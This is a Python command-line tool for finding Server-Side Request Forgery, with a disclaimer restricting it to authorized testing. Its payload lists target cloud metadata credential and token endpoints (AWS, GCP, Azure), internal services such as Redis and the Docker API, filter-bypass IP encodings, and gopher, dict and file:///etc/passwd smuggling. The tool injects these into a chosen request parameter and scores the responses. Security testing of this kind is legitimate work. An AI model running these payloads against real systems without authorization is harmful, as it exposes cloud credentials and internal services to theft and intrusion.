#!/usr/bin/env python3
"""Blind SSRF detection agent.

Tests web application endpoints for Server-Side Request Forgery (SSRF)
vulnerabilities by injecting payloads that trigger out-of-band callbacks.
Uses configurable payload lists targeting internal services, cloud metadata
endpoints, and external callback receivers.

AUTHORIZED TESTING ONLY: Only use against targets you have explicit
written permission to test. Unauthorized SSRF testing is illegal.
"""
import argparse
import json
import sys
import time
import urllib.parse
from datetime import datetime, timezone

try:
    import requests
except ImportError:
    print("[!] 'requests' library required: pip install requests", file=sys.stderr)
    sys.exit(1)


SSRF_PAYLOADS = {
    "aws_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
    ],
    "gcp_metadata": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure_metadata": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
    ],
    "internal_services": [
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:9200/",
        "http://localhost:8500/v1/agent/self",
        "http://127.0.0.1:2375/containers/json",
    ],
    "bypass_filters": [
        "http://0x7f000001/",
        "http://0177.0.0.1/",
        "http://[::1]/",
        "http://127.1/",
        "http://127.0.0.1.nip.io/",
        "http://2130706433/",
    ],
    "protocol_smuggling": [
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/INFO",
        "file:///etc/passwd",
        "file:///etc/hosts",
    ],
}


def test_ssrf_parameter(target_url, param_name, payload, method="GET",
                         headers=None, cookies=None, callback_url=None):
    """Test a single SSRF payload against a parameter."""
    test_payload = callback_url or payload
    if method.upper() == "GET":
        parsed = urllib.parse.urlparse(target_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param_name] = [test_payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        try:
            resp = requests.get(test_url, headers=headers, cookies=cookies,
                                timeout=10, allow_redirects=False)
        except requests.RequestException as e:
            return {"payload": payload, "error": str(e), "vulnerable": False}
    else:
        data = {param_name: test_payload}
        try:
            resp = requests.post(target_url, data=data, headers=headers,
                                 cookies=cookies, timeout=10, allow_redirects=False)
        except requests.RequestException as e:
            return {"payload": payload, "error": str(e), "vulnerable": False}

    indicators = analyze_response(resp, payload)
    return {
        "payload": payload,
        "status_code": resp.status_code,
        "response_length": len(resp.content),
        "response_time": resp.elapsed.total_seconds(),
        "indicators": indicators,
        "vulnerable": len(indicators) > 0,
    }


def analyze_response(resp, payload):
    """Analyze HTTP response for SSRF success indicators."""
    indicators = []
    body = resp.text.lower()

    # Cloud metadata indicators
    if "169.254.169.254" in payload:
        if any(kw in body for kw in ["ami-id", "instance-id", "security-credentials",
                                       "access-key", "computemetadata", "subscriptionid"]):
            indicators.append("Cloud metadata content detected in response")

    # Internal service indicators
    if "127.0.0.1" in payload or "localhost" in payload:
        if resp.status_code == 200 and len(resp.content) > 0:
            if any(kw in body for kw in ["redis_version", "elasticsearch", "docker",
                                          "consul", "apache", "nginx", "server:"]):
                indicators.append("Internal service response detected")

    # File content indicators
    if "file://" in payload:
        if "root:" in body or "localhost" in body:
            indicators.append("Local file content detected in response")

    # Time-based detection
    if resp.elapsed.total_seconds() > 5:
        indicators.append(f"Slow response ({resp.elapsed.total_seconds():.1f}s) - possible network timeout to internal host")

    # Differential response analysis
    if resp.status_code in (200, 301, 302) and len(resp.content) > 100:
        indicators.append(f"Non-error response with content (status: {resp.status_code}, size: {len(resp.content)})")

    return indicators


def run_ssrf_scan(target_url, param_name, method="GET", categories=None,
                   headers=None, cookies=None, callback_url=None):
    """Run SSRF tests across payload categories."""
    if categories is None:
        categories = list(SSRF_PAYLOADS.keys())

    results = []
    total = sum(len(SSRF_PAYLOADS.get(c, [])) for c in categories)
    print(f"[*] Testing {total} SSRF payloads across {len(categories)} categories")
    print(f"[*] Target: {target_url} (param: {param_name}, method: {method})")

    for category in categories:
        payloads = SSRF_PAYLOADS.get(category, [])
        print(f"\n  [{category}] Testing {len(payloads)} payloads...")
        for payload in payloads:
            result = test_ssrf_parameter(
                target_url, param_name, payload, method, headers, cookies, callback_url
            )
            result["category"] = category
            results.append(result)
            if result["vulnerable"]:
                print(f"    [VULN] {payload}")
                for ind in result["indicators"]:
                    print(f"           -> {ind}")
            time.sleep(0.5)  # Rate limiting

    return results


def format_summary(results, target_url):
    """Print scan summary."""
    vulnerable = [r for r in results if r.get("vulnerable")]
    print(f"\n{'='*60}")
    print("  SSRF Scan Report")
    print(f"{'='*60}")
    print(f"  Target       : {target_url}")
    print(f"  Payloads     : {len(results)}")
    print(f"  Vulnerable   : {len(vulnerable)}")

    if vulnerable:
        print("\n  Confirmed/Suspected Vulnerabilities:")
        for v in vulnerable:
            print(f"    [{v['category']:20s}] {v['payload']}")
            for ind in v.get("indicators", []):
                print(f"      -> {ind}")

    by_category = {}
    for r in vulnerable:
        by_category.setdefault(r["category"], []).append(r)
    if by_category:
        print("\n  Findings by Category:")
        for cat, items in by_category.items():
            print(f"    {cat:25s}: {len(items)} finding(s)")


def main():
    parser = argparse.ArgumentParser(
        description="Blind SSRF detection agent (authorized testing only)"
    )
    parser.add_argument("--target", required=True, help="Target URL with parameter to test")
    parser.add_argument("--param", required=True, help="Parameter name to inject SSRF payloads into")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--categories", nargs="+", choices=list(SSRF_PAYLOADS.keys()),
                        help="SSRF payload categories to test")
    parser.add_argument("--callback", help="Out-of-band callback URL (e.g., Burp Collaborator)")
    parser.add_argument("--header", nargs="+", help="Custom headers (key:value)")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--output", "-o", help="Output JSON report path")
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    headers = {}
    if args.header:
        for h in args.header:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.strip().split("=", 1)
                cookies[k] = v

    results = run_ssrf_scan(
        args.target, args.param, args.method, args.categories,
        headers or None, cookies or None, args.callback
    )
    format_summary(results, args.target)

    vulnerable = [r for r in results if r.get("vulnerable")]
    report = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "tool": "SSRF Scanner",
        "target": args.target,
        "parameter": args.param,
        "total_payloads": len(results),
        "vulnerable_count": len(vulnerable),
        "findings": vulnerable,
        "all_results": results if args.verbose else [],
        "risk_level": (
            "CRITICAL" if any(r["category"] in ("aws_metadata", "gcp_metadata", "azure_metadata")
                             for r in vulnerable)
            else "HIGH" if vulnerable
            else "LOW"
        ),
    }

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n[+] Report saved to {args.output}")
    elif args.verbose:
        print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
